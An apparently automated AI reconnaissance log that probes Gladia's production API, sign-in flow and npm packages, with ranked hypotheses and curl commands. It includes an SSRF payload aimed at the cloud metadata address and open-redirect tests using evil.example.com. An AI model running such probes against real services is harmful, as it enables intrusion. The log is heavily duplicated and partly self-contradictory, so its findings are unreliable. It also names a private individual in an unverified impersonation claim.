# LEADS laguna (seed)
- 2026-08-07 SEED: no model output yet; pipeline starts on first run.
## 2026-08-07 18:29:33 UTC [app] (model laguna)
[PRIO] api.gladia.io (CORS+wildcard + openapi.json), score 8.2 | attack:9, business:8, tech:7 (CORS misconfig), gate:9 (no auth on 404), cloud:8 (HSTS), freshness:10
[PRIO] api.gladia.io/openapi.json (full spec exposure), score 7.4 | attack:8, business:8, tech:7 (spec exposure), gate:10, cloud:6, freshness:8
[PRIO] app.gladia.io (return-to cookie JWT-shaped), score 6.8 | attack:7, business:6, tech:7 (JWT-ish cookie), gate:8, cloud:5, freshness:6
[PRIO] npm `gladia` 0.1.3 vs @gladiaio/sdk ownership conflict, score 5.1 | attack:6, business:5, tech:5, gate:9, cloud:4, freshness:7
[HYP] CORS wildcard reflects origin
class: MISCONFIG
asset: api.gladia.io
confidence: 75
reasoning: Known CORS `access-control-allow-origin: *` already confirmed; need to verify if it reflects a credentialed origin or sets Access-Control-Allow-Credentials. Seed explicitly asks "verify actual behavior."
evidence_needed: Origin header reflected in ACAO, or Access-Control-Allow-Credentials: true with credentials
verify_steps: passive PROBE: `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/openapi.json`
impact: Attacker can read API spec + 404 details cross-origin; possible credentialed exfiltration if credentials allowed
testability: PASSIVE
[HYP] OpenAPI spec contains undocumented or shadow endpoints
class: MISCONFIG
asset: api.gladia.io/openapi.json
confidence: 55
reasoning: Spec is consumed by official SDK generator; seed says "check for undocumented/shadow endpoints." Spec lists 14 paths but may contain internal, deprecated, or test routes not documented externally.
evidence_needed: Path in spec that returns 200 with valid (or different) behavior vs. documented expectation, or path absent from public docs
verify_steps: passive PROBE: compare every path in spec against public docs; request a few obscure paths (e.g., /v1/history) to confirm reachability
impact: Unknown API surface, potential unauthenticated access to sensitive operations
testability: PASSIVE
[HYP] return-to cookie has weak/no signature validation
class: AUTH
asset: app.gladia.io/signin (redirect flow)
confidence: 45
reasoning: Cookie `return-to=eyJ1urwiOiIvIn0%3D` decodes to `{"url":"/"}` with no dot-separated signature segment (no alg). Seed asks to "check signature/alg handling."
evidence_needed: Server accepts crafted return-to value and redirects to attacker-controlled or unintended target
verify_steps: AUTH_HELPED: requires interactive signin flow test; not feasible passively without credential
impact: Open redirect / auth bypass in SSO flow
testability: AUTH_HELPED
[FINAL]
[NEXT] PROBE: `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/openapi.json` — check if `access-control-allow-origin` reflects `https://evil.test` and if `access-control-allow-credentials: true` is present.
[RISK] api.gladia.io: 72 reason: CORS wildcard exposure + full OpenAPI spec + x-api-key auth only | app.gladia.io: 55 reason: JWT-shaped unsigned cookie in redirect flow | sdk: 45 reason: npm ownership discrepancy (gladia vs @gladiaio/sdk)
## 2026-08-07 18:51:46 UTC [app] (model laguna)
[HYP] CORS wildcard enables cross-origin read of API data/spec (no credential support)
class: MISCONFIG
asset: api.gladia.io (all responses, incl. /openapi.json and /v1/models)
confidence: 65
reasoning: Passive OPTIONS/GET probes confirm static `access-control-allow-origin: *` with NO `access-control-allow-credentials`. Any origin can read the public OpenAPI spec, 404 bodies, exposed trace headers, and the unauthenticated /v1/models response cross-origin. Credentialled exfiltration is NOT enabled, but cross-origin readability broadens attacker reach.
evidence_needed: `access-control-allow-origin: *` in response headers; absence of `access-control-allow-credentials`
verify_steps: passive PROBE (already observed): `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/openapi.json`; `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/v1/models`
impact: Low-severity info disclosure — malicious site reads full API surface + model list + trace headers cross-origin; no credential theft since creds disallowed
testability: PASSIVE
[HYP] return-to cookie is unsigned base64url JSON enabling post-auth redirect manipulation
class: AUTH
asset: app.gladia.io /signin (return-to cookie + redirect_to form action)
confidence: 60
reasoning: Passive probe confirms root `/` sets `return-to=eyJ1cmwiOiIvIn0%3D` which decodes to plain JSON `{"url":"/"}` with 0 dots (no JWT signature). `/signin` reflects `redirect_to=https%3A%2F%2Fevil.example.com` into the OAuth form `action`. A crafted return-to/redirect_to could steer the Google OAuth post-auth redirect to an attacker-controlled host.
evidence_needed: Server honors attacker-supplied return-to/redirect_to and redirects post-authentication (HTTP 302 Location) to an external host
verify_steps: AUTH_HELPED: complete Google OAuth signin with `?redirect_to=https://evil.example.com` and observe the post-auth HTTP 302 Location; passive pre-check: `curl -sS "https://app.gladia.io/signin?redirect_to=https%3A%2F%2Fevil.example.com" | grep -o 'action="[^"]*"'` (already reflects)
impact: Open redirect / post-auth redirect to attacker site for credential capture or phishing; severity medium
testability: AUTH_HELPED
[HYP] npm `gladia` package impersonates official SDK from personal repo
class: OATH
asset: npm `gladia@0.1.3` (github.com/alexisbouchez/gladia.ts)
confidence: 55
reasoning: Passive `npm view` confirms `description` = "Official TypeScript SDK for Gladia" yet `repository.url` points to the personal account alexisbouchez/gladia.ts (not the official gladiaio org). Maintainer is `softwarecitadel <softwarecitadel@gmail.com>`. This is an ownership/typosquat anomaly that can mislead users into importing an unofficial package.
evidence_needed: npm registry metadata (description, repository.url, maintainer) mismatched against the official @gladiaio/sdk
verify_steps: passive PROBE: `npm view gladia@0.1.3 description repository.url maintainer homepage` (already run)
impact: Supply-chain confusion — developers install an unofficial/misattributed SDK thinking it is official; severity medium-high
testability: PASSIVE
[FINAL] (reranked, top first)
[NEXT] PROBE: `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/v1/models` — confirm the GET response also carries `access-control-allow-origin: *` (escalation check: can an attacker origin read the unauthenticated models payload, not just the preflight).
## 2026-08-07 19:22:20 UTC [app] (model laguna)
[PRIO] api.gladia.io, 9.1, attack_surface=10 business_value=9 tech_exposure=8 (Express/Mongo/S3/WSS) gate_ease=10 cloud_surface=9 freshness=10
[PRIO] app.gladia.io /signin, 6.5, attack_surface=6 business_value=8 tech_exposure=6 (OAuth2/React/HttpOnly cookies) gate_ease=6 cloud_surface=5 freshness=8
[PRIO] npm `gladia` 0.1.3 (registry), 5.5, attack_surface=4 business_value=5 tech_exposure=5 (supply-chain) gate_ease=9 cloud_surface=1 freshness=7
[HYP] IDOR on transcription file download endpoints /{id}/file
class: IDOR
asset: api.gladia.io /v2/transcription/{id}/file, /v2/pre-recorded/{id}/file, /v2/live/{id}/file
confidence: 50
reasoning: OpenAPI spec defines three GET {id}/file endpoints for downloading transcription audio/text files; authorization model (object-level access control) is opaque in the spec; endpoint names follow a pattern where {id} is a UUID — if the server does not bind the resource owner to the x-gladia-key scope, cross-account file access is possible. No spec property indicates per-resource ownership validation.
evidence_needed: Successful file download (200 with content) using a valid x-gladia-key belonging to a different user/session than the {id} target; error 403/404 when key does not match owner would disprove it.
verify_steps: AUTH_HELPED — obtain a trial/test API key from Gladia (authorized), POST /v2/transcription with a test audio_url, GET /v2/transcription/{other_user_id}/file with own key; observe 200 (IDOR) vs 403 (protected). Compare against /v2/pre-recorded/{id}/file and /v2/live/{id}/file.
impact: Unauthorized access to other users' transcription data (PII, audio, sensitive content); High
testability: AUTH_HELPED
[HYP] Post-OAuth redirect_to open redirect without host allowlist
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 48
reasoning: /signin reflects redirect_to URL-encoded into the OAuth form action server-side (verified passively: action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); return-to cookie confirmed as unsigned base64url JSON {"url":"/"} with no allowlist enforced on the cookie; Google-only OAuth flow; if redirect_to is honored post-auth without host validation, the signed-in user lands on attacker domain, enabling phishing or OAuth state theft. Return-to cookie tampering itself was rejected (server resets), but redirect_to is a separate parameter not tested interactively.
evidence_needed: After completing Google OAuth with ?redirect_to=https://evil.example.com, final HTTP 302 Location resolves to external host; redirect_to=//evil.example.com, ?redirect_to=evil.com variants also accepted.
verify_steps: AUTH_HELPED — complete Google OAuth sign-in (authorized/human session), GET /signin?redirect_to=https://evil.example.com, observe post-auth Location header; test protocol-relative and prefix-match variants
impact: Post-auth phishing redirect to attacker-controlled host; potential OAuth code/state interception if redirect_uri is also injectable; Medium
testability: AUTH_HELPED
[HYP] Tech stack disclosure via x-powered-by: Express on CORS preflight
class: MISCONFIG
asset: api.gladia.io (OPTIONS responses)
confidence: 90
reasoning: Confirmed via passive probe: OPTIONS preflight on /v2/pre-recorded returns `x-powered-by: Express`, revealing Node.js/Express.js; this header is absent from GET response headers but present on CORS preflight, enabling targeted framework-specific exploit scanning; combined with CORS wildcard and exposed trace headers, this lowers the bar for finding framework-level misconfigurations.
evidence_needed: `x-powered-by: Express` header in OPTIONS preflight response (observed); absent on GET responses (observed).
verify_steps: PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription`; `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` and compare headers for x-powered-by presence/absence
impact: Aids attacker reconnaissance (framework fingerprinting → known CVE targeting); Low
testability: PASSIVE
[PARKED] IDOR on transcription file download endpoints: confidence 50, AUTH_HELPED — cannot verify without valid API key; downgraded from 55 to 50 after confirming spec does not expose ownership-binding logic. Retained as actionable with key.
[PARKED] Post-OAuth redirect_to open redirect: confidence 48, AUTH_HELPED — return-to cookie REJECTED but redirect_to param is distinct; borderline on 40 threshold but retained due to distinct vector and prior laguna findings.
[FINAL] 1) Tech stack disclosure via x-powered-by: Express on CORS preflight (api.gladia.io, 90, MISCONFIG, PASSIVE)
[FINAL] 2) IDOR on transcription file download endpoints /{id}/file (api.gladia.io, 50, IDOR, AUTH_HELPED)
[FINAL] 3) Post-OAuth redirect_to open redirect without host allowlist (app.gladia.io /signin, 48, OATH, AUTH_HELPED)
[NEXT] PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription` then `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` — compare header sets to confirm `x-powered-by: Express` is present on preflight but absent on GET, and enumerate all framework/fingerprinting headers (e.g., `x-request-id`, `x-correlation-id`, `traceparent`).
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: `x-powered-by: Express` header present on CORS preflight (OPTIONS) responses only — confirms Node.js/Express.js backend; framework fingerprint for CVE targeting
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /health?full=true does NOT leak verbose output — returns identical `{"health":"OK"}` to /health; no build/version/metadata disclosure via query params
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /metrics endpoint does NOT exist — returns 404 (no Prometheus exposition endpoint)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /debug, /admin, /actuator/health, /v1 paths do NOT exist or return 404 — no Spring Boot Actuator, no debug panel, no catch-all admin
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `Access-Control-Request-Headers: x-gladia-key` — auth header permitted in cross-origin requests (no credential support though)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /v2/live/init is NOT a real endpoint — confirmed 404 "Cannot POST"; WebSocket session is created via POST /v2/live, then client connects to returned `url` (wss://api.gladia.io/v2/live?token=<uuid>)
[RISK] api.gladia.io: 82 reason: Express/Node.js backend fingerprinted via x-powered-by on CORS preflight; full OpenAPI 3.1 spec (14 paths) publicly readable without auth; CORS wildcard with x-gladia-key permitted in cross-origin preflight but no credentials; /health endpoint undocumented and exposed with CORS *; WebSocket auth token in URL query param per spec (wss://api.gladia.io/v2/live?token=<uuid>); 401 error responses leak request_id + trace headers; all v2 endpoints uniformly key-gated (single security model, no MFA/scopes); SSTI/SSRF surface via audio_url/video_url (key-gated)
[RISK] app.gladia.io: 52 reason: Google-only OAuth limits auth bypass surface; /dashboard SPA shell served 200 without auth (client-side enforcement only); return-to cookie is unsigned base64url JSON (server resets on tampering, REJECTED open redirect); redirect_to param reflected in form action but post-auth behavior unverified without session; cookies correctly flagged HttpOnly/Secure/SameSite=Lax; HSTS preload in effect; /signin redirects 302 with noindex/nofollow
[RISK] sdk: 45 reason: Official @glidiaio/sdk 1.1.0 + gladiaio-sdk PyPI verified clean (reposcan: no secrets, no malicious code); npm `gladia` 0.1.3 ownership anomaly ACCEPTED (description claims "Official" but repo is personal alexisbouchez/gladia.ts, maintainer softwarecitadel@gmail.com, published before official package) — supply-chain impersonation risk remains; gladia-quiz-app loads @glidiaio/sdk@0.5.2 from unpkg CDN (version pinning on CDN)
## 2026-08-07 20:00:01 UTC [app] (model laguna)
verify_steps: AUTH_HELPED: complete Google OAuth signin with `?redirect_to=https://evil.example.com` and observe the post-auth HTTP 302 Location; passive pre-check: `curl -sS "https://app.gladia.io/signin?redirect_to=https%3A%2F%2Fevil.example.com" | grep -o 'action="[^"]*"'` (already reflects)
impact: Open redirect / post-auth redirect to attacker site for credential capture or phishing; severity medium
testability: AUTH_HELPED
[HYP] npm `gladia` package impersonates official SDK from personal repo
class: OATH
asset: npm `gladia@0.1.3` (github.com/alexisbouchez/gladia.ts)
confidence: 55
reasoning: Passive `npm view` confirms `description` = "Official TypeScript SDK for Gladia" yet `repository.url` points to the personal account alexisbouchez/gladia.ts (not the official gladiaio org). Maintainer is `softwarecitadel <softwarecitadel@gmail.com>`. This is an ownership/typosquat anomaly that can mislead users into importing an unofficial package.
evidence_needed: npm registry metadata (description, repository.url, maintainer) mismatched against the official @gladiaio/sdk
verify_steps: passive PROBE: `npm view gladia@0.1.3 description repository.url maintainer homepage` (already run)
impact: Supply-chain confusion — developers install an unofficial/misattributed SDK thinking it is official; severity medium-high
testability: PASSIVE
[FINAL] (reranked, top first)
[NEXT] PROBE: `curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/v1/models` — confirm the GET response also carries `access-control-allow-origin: *` (escalation check: can an attacker origin read the unauthenticated models payload, not just the preflight).
[PRIO] api.gladia.io, 9.1, attack_surface=10 business_value=9 tech_exposure=8 (Express/Mongo/S3/WSS) gate_ease=10 cloud_surface=9 freshness=10
[PRIO] app.gladia.io /signin, 6.5, attack_surface=6 business_value=8 tech_exposure=6 (OAuth2/React/HttpOnly cookies) gate_ease=6 cloud_surface=5 freshness=8
[PRIO] npm `gladia` 0.1.3 (registry), 5.5, attack_surface=4 business_value=5 tech_exposure=5 (supply-chain) gate_ease=9 cloud_surface=1 freshness=7
[HYP] IDOR on transcription file download endpoints /{id}/file
class: IDOR
asset: api.gladia.io /v2/transcription/{id}/file, /v2/pre-recorded/{id}/file, /v2/live/{id}/file
confidence: 50
reasoning: OpenAPI spec defines three GET {id}/file endpoints for downloading transcription audio/text files; authorization model (object-level access control) is opaque in the spec; endpoint names follow a pattern where {id} is a UUID — if the server does not bind the resource owner to the x-gladia-key scope, cross-account file access is possible. No spec property indicates per-resource ownership validation.
evidence_needed: Successful file download (200 with content) using a valid x-gladia-key belonging to a different user/session than the {id} target; error 403/404 when key does not match owner would disprove it.
verify_steps: AUTH_HELPED — obtain a trial/test API key from Gladia (authorized), POST /v2/transcription with a test audio_url, GET /v2/transcription/{other_user_id}/file with own key; observe 200 (IDOR) vs 403 (protected). Compare against /v2/pre-recorded/{id}/file and /v2/live/{id}/file.
impact: Unauthorized access to other users' transcription data (PII, audio, sensitive content); High
testability: AUTH_HELPED
[HYP] Post-OAuth redirect_to open redirect without host allowlist
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 48
reasoning: /signin reflects redirect_to URL-encoded into the OAuth form action server-side (verified passively: action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); return-to cookie confirmed as unsigned base64url JSON {"url":"/"} with no allowlist enforced on the cookie; Google-only OAuth flow; if redirect_to is honored post-auth without host validation, the signed-in user lands on attacker domain, enabling phishing or OAuth state theft. Return-to cookie tampering itself was rejected (server resets), but redirect_to is a separate parameter not tested interactively.
evidence_needed: After completing Google OAuth with ?redirect_to=https://evil.example.com, final HTTP 302 Location resolves to external host; redirect_to=//evil.example.com, ?redirect_to=evil.com variants also accepted.
verify_steps: AUTH_HELPED — complete Google OAuth sign-in (authorized/human session), GET /signin?redirect_to=https://evil.example.com, observe post-auth Location header; test protocol-relative and prefix-match variants
impact: Post-auth phishing redirect to attacker-controlled host; potential OAuth code/state interception if redirect_uri is also injectable; Medium
testability: AUTH_HELPED
[HYP] Tech stack disclosure via x-powered-by: Express on CORS preflight
class: MISCONFIG
asset: api.gladia.io (OPTIONS responses)
confidence: 90
reasoning: Confirmed via passive probe: OPTIONS preflight on /v2/pre-recorded returns `x-powered-by: Express`, revealing Node.js/Express.js; this header is absent from GET response headers but present on CORS preflight, enabling targeted framework-specific exploit scanning; combined with CORS wildcard and exposed trace headers, this lowers the bar for finding framework-level misconfigurations.
evidence_needed: `x-powered-by: Express` header in OPTIONS preflight response (observed); absent on GET responses (observed).
verify_steps: PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription`; `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` and compare headers for x-powered-by presence/absence
impact: Aids attacker reconnaissance (framework fingerprinting → known CVE targeting); Low
testability: PASSIVE
[PARKED] IDOR on transcription file download endpoints: confidence 50, AUTH_HELPED — cannot verify without valid API key; downgraded from 55 to 50 after confirming spec does not expose ownership-binding logic. Retained as actionable with key.
[PARKED] Post-OAuth redirect_to open redirect: confidence 48, AUTH_HELPED — return-to cookie REJECTED but redirect_to param is distinct; borderline on 40 threshold but retained due to distinct vector and prior laguna findings.
[FINAL] 1) Tech stack disclosure via x-powered-by: Express on CORS preflight (api.gladia.io, 90, MISCONFIG, PASSIVE)
[FINAL] 2) IDOR on transcription file download endpoints /{id}/file (api.gladia.io, 50, IDOR, AUTH_HELPED)
[FINAL] 3) Post-OAuth redirect_to open redirect without host allowlist (app.gladia.io /signin, 48, OATH, AUTH_HELPED)
[NEXT] PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription` then `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` — compare header sets to confirm `x-powered-by: Express` is present on preflight but absent on GET, and enumerate all framework/fingerprinting headers (e.g., `x-request-id`, `x-correlation-id`, `traceparent`).
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: `x-powered-by: Express` header present on CORS preflight (OPTIONS) responses only — confirms Node.js/Express.js backend; framework fingerprint for CVE targeting
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /health?full=true does NOT leak verbose output — returns identical `{"health":"OK"}` to /health; no build/version/metadata disclosure via query params
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /metrics endpoint does NOT exist — returns 404 (no Prometheus exposition endpoint)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: /debug, /admin, /actuator/health, /v1 paths do NOT exist or return 404 — no Spring Boot Actuator, no debug panel, no catch-all admin
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `Access-Control-Request-Headers: x-gladia-key` — auth header permitted in cross-origin requests (no credential support though)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /v2/live/init is NOT a real endpoint — confirmed 404 "Cannot POST"; WebSocket session is created via POST /v2/live, then client connects to returned `url` (wss://api.gladia.io/v2/live?token=<uuid>)
[RISK] api.gladia.io: 82 reason: Express/Node.js backend fingerprinted via x-powered-by on CORS preflight; full OpenAPI 3.1 spec (14 paths) publicly readable without auth; CORS wildcard with x-gladia-key permitted in cross-origin preflight but no credentials; /health endpoint undocumented and exposed with CORS *; WebSocket auth token in URL query param per spec (wss://api.gladia.io/v2/live?token=<uuid>); 401 error responses leak request_id + trace headers; all v2 endpoints uniformly key-gated (single security model, no MFA/scopes); SSTI/SSRF surface via audio_url/video_url (key-gated)
[RISK] app.gladia.io: 52 reason: Google-only OAuth limits auth bypass surface; /dashboard SPA shell served 200 without auth (client-side enforcement only); return-to cookie is unsigned base64url JSON (server resets on tampering, REJECTED open redirect); redirect_to param reflected in form action but post-auth behavior unverified without session; cookies correctly flagged HttpOnly/Secure/SameSite=Lax; HSTS preload in effect; /signin redirects 302 with noindex/nofollow
[RISK] sdk: 45 reason: Official @glidiaio/sdk 1.1.0 + gladiaio-sdk PyPI verified clean (reposcan: no secrets, no malicious code); npm `gladia` 0.1.3 ownership anomaly ACCEPTED (description claims "Official" but repo is personal alexisbouchez/gladia.ts, maintainer softwarecitadel@gmail.com, published before official package) — supply-chain impersonation risk remains; gladia-quiz-app loads @glidiaio/sdk@0.5.2 from unpkg CDN (version pinning on CDN)
[PRIO] api.gladia.io, 8.5, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=8
[PRIO] app.gladia.io, 6.3, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[PRIO] npm @gladiaio/sdk, 5.0, attack_surface=5 business_value=6 tech_exposure=5 gate_ease=8 cloud_surface=3 freshness=6
[PRIO] PyPI gladiaio-sdk, 4.7, attack_surface=4 business_value=6 tech_exposure=4 gate_ease=8 cloud_surface=3 freshness=6
[PRIO] npm gladia (typosquat candidate), 4.3, attack_surface=4 business_value=5 tech_exposure=4 gate_ease=9 cloud_surface=2 freshness=5
[HYP] SSRF via audio_url/video_url server-side fetch
class: SSRF
asset: api.gladia.io
confidence: 65
reasoning: OpenAPI shows transcription endpoints accept audio_url/video_url parameters; server likely fetches these URLs server-side; no SSRF protections documented in spec; v2/live init may also accept URL inputs
evidence_needed: Confirm server-side fetch behavior; test with internal metadata URLs (169.254.169.254), localhost, private CIDRs; check for redirect following
verify_steps: RAG: read gladiaio/sdk packages/sdk-js + packages/sdk-python + generator and gladia-samples to confirm how audio_url/video_url flows into api.gladia.io; PROBE: POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}' (AUTH_HELPED)
impact: Cloud metadata access, internal service enumeration, potential data exfiltration; severity High
testability: AUTH_HELPED
[HYP] CORS wildcard reflects arbitrary origin enabling cross-origin API reads
class: MISCONFIG
asset: api.gladia.io
confidence: 75
reasoning: Preflight shows access-control-allow-origin: * with allow-headers: x-gladia-key but NO access-control-allow-credentials; wildcard reflects request Origin header value per prior probe; allows unauthenticated cross-origin reads of public endpoints (/v1/models, /openapi.json, /health)
evidence_needed: Confirm Origin reflection on credentialed endpoints; verify no credential leakage via wildcard
verify_steps: PROBE: curl -H "Origin: https://evil.test" -D - -o /dev/null https://api.gladia.io/v1/models — confirm access-control-allow-origin reflects https://evil.test; PROBE: curl -H "Origin: https://evil.test" -H "x-gladia-key: test" -D - -o /dev/null https://api.gladia.io/v2/transcription — observe 401 but check CORS headers
impact: Data exposure from public endpoints; aids reconnaissance; severity Low-Medium
testability: PASSIVE
[HYP] npm package gladia@0.1.3 typosquats official @gladiaio/sdk namespace
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 70
reasoning: Package description claims "Official TypeScript SDK for Gladia" but repository=github.com/alexisbouchez/gladia.ts (personal account), maintainer=softwarecitadel@gmail.com; official SDK is @gladiaio/sdk from gladiaio/sdk monorepo; users may install wrong package
evidence_needed: Verify if alexisbouchez/softwarecitadel is affiliated with Gladia; check package code for malicious behavior; compare API surface with official SDK
verify_steps: RAG: Read github.com/alexisbouchez/gladia.ts source; diff against @gladiaio/sdk; check install scripts, network calls, data exfiltration; HUMAN: Contact Gladia security to confirm ownership
impact: Supply chain risk — developers may install impersonated SDK leading to credential theft or malicious code execution; severity Medium-High
testability: RAG
[FINAL] 1) SSRF via audio_url/video_url server-side fetch (api.gladia.io, 65, SSRF) 2) CORS wildcard reflects arbitrary origin enabling cross-origin API reads (api.gladia.io, 75, MISCONFIG) 3) npm package gladia@0.1.3 typosquats official @gladiaio/sdk namespace (npm registry, 70, OTHER)
[NEXT] RAG: Read gladiaio/sdk (packages/sdk-js + packages/sdk-python + generator) and gladia-samples to confirm how audio_url/video_url flows into api.gladia.io (any client-side validation, SSRF protections documented)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: Undocumented /health endpoint returns 200 (not in OpenAPI spec)
[LEARN] ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per OpenAPI spec
[LEARN] REJECTED AUTH @ app.gladia.io: return-to cookie tampering does not lead to open redirect (server validates/resets)
[LEARN] ACCEPTED OTHER @ npm registry: gladia@0.1.3 ownership anomaly (personal repo, unofficial maintainer) — requires affiliation verification
[RISK] api.gladia.io: 85 reason: Public OpenAPI spec reveals full attack surface; CORS wildcard with credential-exposed headers; WebSocket token-in-URL design; undocumented /health endpoint; no auth on spec endpoint; high business value (core transcription API); potential SSRF via audio_url/video_url
[RISK] app.gladia.io: 55 reason: Dashboard SPA served without auth (client-side enforcement); return-to cookie validated server-side; redirect_to reflected in form action but no open redirect; HSTS preload strong; Google-only OAuth limits attack surface
[RISK] sdk: 40 reason: Official SDKs (@gladiaio/sdk, gladiaio-sdk) generated from public spec; third-party gladia@0.1.3 is ownership anomaly but not Gladia code; no malicious behavior observed in package metadata
[PRIO] api.gladia.io, 9.1, attack_surface=10 business_value=9 tech_exposure=8 (Express/Mongo/S3/WSS) gate_ease=10 cloud_surface=9 freshness=10
[PRIO] app.gladia.io /signin, 6.5, attack_surface=6 business_value=8 tech_exposure=6 (OAuth2/React/HttpOnly cookies) gate_ease=6 cloud_surface=5 freshness=8
[PRIO] npm `gladia` 0.1.3 (registry), 5.5, attack_surface=4 business_value=5 tech_exposure=5 (supply-chain) gate_ease=9 cloud_surface=1 freshness=7
[HYP] IDOR on transcription file download endpoints /{id}/file
class: IDOR
asset: api.gladia.io /v2/transcription/{id}/file, /v2/pre-recorded/{id}/file, /v2/live/{id}/file
confidence: 50
reasoning: OpenAPI spec defines three GET {id}/file endpoints for downloading transcription audio/text files; authorization model (object-level access control) is opaque in the spec; endpoint names follow a pattern where {id} is a UUID — if the server does not bind the resource owner to the x-gladia-key scope, cross-account file access is possible. No spec property indicates per-resource ownership validation.
evidence_needed: Successful file download (200 with content) using a valid x-gladia-key belonging to a different user/session than the {id} target; error 403/404 when key does not match owner would disprove it.
verify_steps: AUTH_HELPED — obtain a trial/test API key from Gladia (authorized), POST /v2/transcription with a test audio_url, GET /v2/transcription/{other_user_id}/file with own key; observe 200 (IDOR) vs 403 (protected). Compare against /v2/pre-recorded/{id}/file and /v2/live/{id}/file.
impact: Unauthorized access to other users' transcription data (PII, audio, sensitive content); High
testability: AUTH_HELPED
[HYP] Post-OAuth redirect_to open redirect without host allowlist
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 48
reasoning: /signin reflects redirect_to URL-encoded into the OAuth form action server-side (verified passively: action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); return-to cookie confirmed as unsigned base64url JSON {"url":"/"} with no allowlist enforced on the cookie; Google-only OAuth flow; if redirect_to is honored post-auth without host validation, the signed-in user lands on attacker domain, enabling phishing or OAuth state theft. Return-to cookie tampering itself was rejected (server resets), but redirect_to is a separate parameter not tested interactively.
evidence_needed: After completing Google OAuth with ?redirect_to=https://evil.example.com, final HTTP 302 Location resolves to external host; redirect_to=//evil.example.com, ?redirect_to=evil.com variants also accepted.
verify_steps: AUTH_HELPED — complete Google OAuth sign-in (authorized/human session), GET /signin?redirect_to=https://evil.example.com, observe post-auth Location header; test protocol-relative and prefix-match variants
impact: Post-auth phishing redirect to attacker-controlled host; potential OAuth code/state interception if redirect_uri is also injectable; Medium
testability: AUTH_HELPED
[HYP] Tech stack disclosure via x-powered-by: Express on CORS preflight
class: MISCONFIG
asset: api.gladia.io (OPTIONS responses)
confidence: 90
reasoning: Confirmed via passive probe: OPTIONS preflight on /v2/pre-recorded returns `x-powered-by: Express`, revealing Node.js/Express.js; this header is absent from GET response headers but present on CORS preflight, enabling targeted framework-specific exploit scanning; combined with CORS wildcard and exposed trace headers, this lowers the bar for finding framework-level misconfigurations.
evidence_needed: `x-powered-by: Express` header in OPTIONS preflight response (observed); absent on GET responses (observed).
verify_steps: PROBE: `curl -sS -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription`; `curl -sS -D - -o /dev/null https://api.gladia.io/v2/transcription` and compare headers for x-powered-by presence/absence
impact: Aids attacker reconnaissance (framework fingerprinting → known CVE targeting); Low
testability: PASSIVE
[PARKED] IDOR on transcription file download endpoints: confidence 50, AUTH_HELPED — cannot verify without valid API key; downgraded from 55 to 50 after confirming spec does not expose ownership-binding logic. Retained as actionable with key.
[PARKED] Post-OAuth redirect_to open redirect: confidence 48, AUTH_HELPED — return-to cookie REJECTED but redirect_to param is distinct; borderline on 40 threshold but retained due to distinct vector and prior laguna findings.
[FINAL] 1) Tech stack disclosure via x-powered-by: Express on CORS preflight (api.gladia.io, 90, MISCONFIG, PASSIVE)
[FINAL] 2) IDOR on transcription file download endpoints /{id}/file (api.gladia.io, 50, IDOR, AUTH_HELPED)
[FINAL] 3) Post-OAuth redirect_to open redirect without host allowlist (app.gladia.io /signin, 48, OATH, AUTH_HELPED)
